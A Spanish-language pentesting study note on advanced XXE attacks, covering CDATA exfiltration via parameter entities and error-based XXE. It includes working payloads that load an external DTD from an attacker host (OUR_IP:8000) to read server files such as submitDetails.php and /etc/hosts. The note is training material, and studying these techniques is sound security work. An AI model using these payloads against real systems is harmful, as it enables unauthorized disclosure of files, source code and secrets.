---
tags:
  - Web/Red-Team
  - Pentesting/Explotacion
  - XXE
Descripción: "Cuando el método básico falla —el fichero tiene caracteres que rompen el XML, o la app no refleja ninguna entidad— recurrimos a dos técnicas: exfiltración con CDATA (para…"
Fecha de actualización: 2026-07-15
Nota previa: "[[16 - XXE a RCE, SSRF y DoS]]"
Nota siguiente: "[[18 - Exfiltración de datos ciega (OOB)]]"
Area: "[[Web Attacks.base|Web Attacks]]"
---
---

Cuando el [[15 - Divulgación de archivos locales|método básico]] falla —el fichero tiene caracteres que rompen el XML, o la app **no refleja** ninguna entidad— recurrimos a dos técnicas: exfiltración con `CDATA` (para cualquier framework, no solo PHP) y XXE **error-based**.

# Exfiltración con CDATA + parameter entities

`php://filter` solo sirve en PHP. Para leer ficheros con caracteres especiales o binarios en **cualquier** stack, envolvemos el contenido en una sección `CDATA` (`<![CDATA[ ... ]]>`), que el parser trata como **datos crudos** y no intenta interpretar.

El intento ingenuo **no funciona**:

```xml
<!DOCTYPE email [
  <!ENTITY begin "<![CDATA[">
  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY end "]]>">
  <!ENTITY joined "&begin;&file;&end;">
]>
```

<mark style="background: #FFB8EBA6;">XML prohíbe combinar entidades internas y externas dentro de una misma entidad general</mark>. La solución son las **XML Parameter Entities**: un tipo especial que empieza por `%`, solo usable **dentro del DTD**. Su truco: si se referencian desde una **fuente externa** (nuestro servidor), todas se consideran externas y **sí** se pueden combinar.

Alojamos en nuestro servidor un `xxe.dtd` con la entidad que une las tres piezas:

```shell-session
$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
$ python3 -m http.server 8000
```

Y enviamos este XML al objetivo, que carga nuestro DTD externo y luego referencia `&joined;`:

```xml
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- inicio del CDATA -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- fichero objetivo -->
  <!ENTITY % end "]]>"> <!-- fin del CDATA -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- nuestro DTD externo -->
  %xxe;
]>
...
<email>&joined;</email>
```

Resultado: el código fuente de `submitDetails.php` **sin** necesidad de `base64`, lo que ahorra tiempo al revisar muchos ficheros buscando secretos. <mark style="background: #8000E1A6;">Es la técnica portable: funciona con cualquier framework, no solo PHP</mark>.

> [!warning]+ `%` vs `&` y self-reference
> `%entidad;` se usa **dentro del DTD**; `&entidad;` en el **cuerpo** del documento. Confundirlos es el error nº1 al escribir payloads XXE avanzados. Además, algunos servidores modernos impiden leer ciertos ficheros (`index.php`) por su protección contra el bucle de auto-referencia de entidades (el [[16 - XXE a RCE, SSRF y DoS|billion laughs]]).

# XXE error-based

Escenario distinto: la app **no escribe salida** — ninguna entidad se refleja, así que no tenemos dónde "imprimir" el fichero. Si además la app <mark style="background: #ADCCFFA6;">muestra errores de runtime</mark> (p. ej. errores PHP) sin manejo de excepciones, podemos exfiltrar **dentro del mensaje de error**.

Primero comprobamos que la app filtra errores enviando XML malformado (borrar un cierre, `<roo>` en vez de `<root>`, o referenciar una entidad inexistente). Si aparece un error —que además suele revelar el **directorio del servidor**—, seguimos.

Alojamos un DTD que define el fichero objetivo y lo une con una entidad **inexistente**, forzando un error que arrastra el contenido del fichero:

```xml
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

`%nonExistingEntity;` no existe → el parser lanza un error del tipo *"esta entidad no existe: <contenido de /etc/hosts>"*, filtrando el fichero en el propio mensaje. El payload que enviamos al objetivo:

```xml
<!DOCTYPE email [
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

No hace falta incluir el resto del XML. La respuesta de error contiene el `/etc/hosts`. Para leer código fuente, cambia el `file://` a la ruta deseada.

> [!info]+ Fiabilidad
> El error-based es <mark style="background: #FFB8EBA6;">menos fiable</mark> que el CDATA: hay **límites de longitud** en los mensajes de error (ficheros largos se truncan) y ciertos caracteres especiales aún lo rompen. Úsalo cuando no hay reflexión de entidades pero sí errores visibles. Si tampoco hay errores → estamos [[18 - Exfiltración de datos ciega (OOB)|completamente a ciegas]] y toca exfiltración out-of-band.

El caso más duro —ni reflexión ni errores— se resuelve con exfiltración [[18 - Exfiltración de datos ciega (OOB)|ciega out-of-band]], donde sacamos los datos por un canal lateral hacia nuestro servidor.

## Referencias

- PortSwigger — [Blind XXE with out-of-band interaction](https://portswigger.net/web-security/xxe/blind) y [error-based](https://portswigger.net/web-security/xxe/blind#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
- PayloadsAllTheThings — [XXE Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- HTB Academy — *Web Attacks* (base, 2021)
